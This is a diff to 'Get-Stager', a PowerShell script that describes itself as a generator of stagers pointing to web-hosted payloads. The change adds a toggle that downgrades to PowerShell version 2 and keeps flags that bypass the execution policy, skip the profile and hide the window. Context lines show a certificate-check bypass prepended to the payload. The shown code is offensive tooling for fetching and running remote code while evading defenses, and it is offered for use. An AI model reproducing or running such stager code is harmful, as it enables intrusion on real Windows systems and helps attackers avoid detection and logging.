@@ -1,7 +1,7 @@
 ﻿function Get-Stager {
 #.SYNOPSIS
 # Simple PowerShell stager generator to point to web hosted payloads.
-# ARBITRARY VERSION NUMBER:  3.5.2
+# ARBITRARY VERSION NUMBER:  3.5.3
 # AUTHOR:  Tyler McCann (@tylerdotrar)
 #
 #.DESCRIPTION
@@ -112,9 +112,13 @@ Add-Type `$CertificateBypass
     $Stager = $Bypass + $Payload
 
 
+    # Toggle PowerShell 2
+    if ($PowerShell2Support) { $BinParams = $Binary + ' -version 2' }
+    else                     { $BinParams = $Binary                 }
+
+
     # Toggle '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden' PowerShell Parameters
-    if (!$Headless) { $BinParams = $Binary + ' -nop -ex bypass -wi h' } 
-    else            { $BinParams = $Binary                            }
+    if (!$Headless) { $BinParams += ' -nop -ex bypass -wi h' } 
 
 
      # Cleartext or Base64 Payload
